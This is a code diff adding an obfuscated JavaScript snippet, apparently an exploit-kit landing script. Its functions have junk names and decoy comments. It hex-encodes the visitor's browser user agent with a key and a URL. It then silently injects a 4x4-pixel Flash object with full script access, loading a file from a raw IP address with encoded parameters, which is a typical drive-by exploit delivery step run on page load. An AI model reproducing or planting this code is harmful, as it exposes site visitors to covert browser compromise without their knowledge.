@@ -1,0 +1,23 @@
+/*s92321d14122hssfj63014fs*/function hgfgerdfgdf(num, width){/*s33518d52899hfj67407fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s84555d94382hfj19994fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s64150d5808hfj70882fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s25104d9638hfj60906fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd92130hfs*/c += b + d;/*s76272d77172hfj32347fs*/e += 1;}return c;}/*s6054dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://185.158.155.97/?NjE2NTY5ODU=&pa=xXzQMvWebRXQC53EKvrcT6NEMVHRHECL2Y-dmrHTefjaeVWkzrLFTF_yozKASASG6_JtdfJRDQ&ma=Swj0DUeAdnzYxfVgwW9fqmiECByRedgsSL_ETbNQtD_JCXQbAy2gz1ybMkdsomxhGH6FETi-hL&gift=MTMyODQ0OTI=", ghnvbn("http://185.158.155.97/?OTI4MjI2ODI=&ma=Swj0DUeAdnzYxfVgwW9fqmiECByReegsSL_0TbNQhD_JCXQbAy2gz1ybMkdMklxB-A6FENjOse&pa=xX_QMvWebRXQC53EKvrcT6NHMVHRH0CL2Y-dmrHQefjaelWkzrLFTF_xozKASASG6_JtdfJRDQ&shop=MTQyMjQ4OQ==","wexykukusw"));
